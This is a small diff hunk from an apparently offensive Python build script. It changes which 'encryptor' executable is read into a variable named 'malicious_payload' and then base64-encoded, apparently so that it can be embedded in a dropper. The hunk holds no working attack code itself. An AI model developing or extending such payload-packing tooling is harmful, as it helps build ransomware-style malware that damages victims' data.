@@ -24,7 +24,7 @@ if __name__ == "__main__":
     #create new exe
 
     #BS64 encode EXE
-    with open("build\\encryptor.exe", "rb") as malicious_payload:
+    with open("build\\encryptor1.1.exe", "rb") as malicious_payload:
         payload = malicious_payload.read()
         encoded_payload = encodeclass.encode(payload)
 
